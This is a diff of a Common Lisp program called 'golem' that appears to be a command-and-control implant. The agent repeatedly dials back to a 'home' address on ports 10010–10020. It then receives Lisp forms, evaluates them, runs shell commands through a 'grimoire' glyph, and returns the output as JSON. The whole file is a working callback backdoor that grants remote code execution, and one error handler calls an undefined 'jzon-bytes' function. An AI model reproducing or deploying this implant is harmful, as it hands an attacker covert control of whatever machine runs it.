@@ -1,10 +1,18 @@
 (defpackage golem
-  (:use :cl))
+  (:use :cl)
+  (:local-nicknames (:jzon :com.inuoe.jzon)))
 (in-package :golem)
 
 (defparameter *buffer-size* 4096)
 (defvar *max-payload-length* 4294967296)
 (defvar *element-type* '(unsigned-byte 8))
+
+;; grimoire definitions
+
+(grimoire::define-glyph :command local (command)
+  (sh command))
+
+;; utils
 
 (defun int->bytes (number n-bytes)
   "turn a number into a buffer of n-bytes in big endian"
@@ -45,7 +53,11 @@
 
 (defun recv-data (socket)
   (format t "[+] Waiting for input from home...~%")
-  (usocket:wait-for-input socket)
+  (multiple-value-bind (sockets remaining-time)
+      (usocket:wait-for-input socket :timeout 60)
+    (format t "[+] Sockets: ~a. Remaining timeout: ~a~%" 
+            sockets remaining-time)
+    (when (not remaining-time) (error "Timeout")))
 
   (format t "[+] Starting to read...~%")
 
@@ -75,38 +87,55 @@
   (with-output-to-string (stream)
     (uiop:run-program command :output stream)))
 
-(defun search-for-port (ip &key (start 10000) (end 10010))
-  (loop for port = start then (1+ port)
-        for socket = (ignore-errors
-                       (usocket:socket-connect
-                        ip port :element-type *element-type*))
-        do (format t "[+] Trying to connect to ~a:~a... ~a~%"
-                   ip port socket)
-        if socket do (return (values socket port))
-        if (= port end) do (setf port (1- start))
-        do (sleep 1)))
+(defun make-response (result stdout)
+  (let ((ht (make-hash-table)))
+    (setf (gethash :result ht) result)
+    (setf (gethash :stdout ht) stdout)
+    (trivial-utf-8:string-to-utf-8-bytes
+     (jzon:stringify ht))))
 
-(defun dial-home (home-ip)
-  (multiple-value-bind (socket port) (search-for-port home-ip)
-    (format t "[+] Connected! Now waiting for commands from ~a:~a~%"
-            home-ip port)
-    (loop for command = (recv-data socket)
-          do (format t "[+] Received: ~a~%" command)
-          if (string= command "(quit)")
-          do (send-data socket #(111 107))
-          until (string= command "(quit)")
-          do (format t "[+] Evaluating message from *home*...~%")
-          do (ignore-errors
-               (with-input-from-string (s command)
-                 (let ((result (eval (read s))))
-                   (format t "[+] Result: \"~a\"~%" result)
-                   (send-data socket
-                              (trivial-utf-8:string-to-utf-8-bytes
-                               (format nil "~a" result)))))))
+(defun make-easy-string ()
+  (make-array
+   '(0) :element-type 'base-char
+   :fill-pointer 0
+   :adjustable t))
 
-    (finish-output (usocket:socket-stream socket))
-    (usocket:socket-close socket)))
+(defun eval-command (command)
+  (handler-case 
+      (with-input-from-string (s command)
+        (let* ((fake-stdout (make-easy-string)))
+          (with-output-to-string (*standard-output* fake-stdout)
+            (make-response (eval (read s)) fake-stdout))))
+    (error (e) 
+      (make-response (format nil "Failed to execute command: ~a" e) nil))))
+
+(defun dial-home (socket)
+  (loop for command = (recv-data socket)
+        for exit = (string= command "(quit)")
+        do (format t "[+] Received: ~a~%" command)
+        if exit do (send-data socket (make-response "OK" ""))
+        until exit 
+        do (progn
+             (format t "[+] Evaluating message from *home*...~%")
+             (let ((result (handler-case (eval-command command)
+                             (error (c) (jzon-bytes (format nil "ERROR! ~a~%" c) "")))))
+               (format t "[+] Evaluation result: ~a...~%" result)
+               (send-data socket result))))
+
+  (finish-output (usocket:socket-stream socket))
+  (usocket:socket-close socket))
 
 (defun entry ()
-  (let ((home-ip (car (uiop:command-line-arguments))))
-    (loop while t do (dial-home home-ip))))
+  (let ((home-ip (or (car (uiop:command-line-arguments)) "localhost"))
+        (start 10010) (end 10020))
+    (loop for port = start then (1+ port)
+          for socket = (ignore-errors
+                         (usocket:socket-connect
+                          home-ip port 
+                          :element-type *element-type*
+                          :timeout 1))
+          do (format t "[+] Trying to connect to ~a:~a... ~a~%"
+                     home-ip port socket)
+          if socket do (ignore-errors (dial-home socket))
+          if (= port end) do (setf port (1- start))
+          do (sleep 1))))
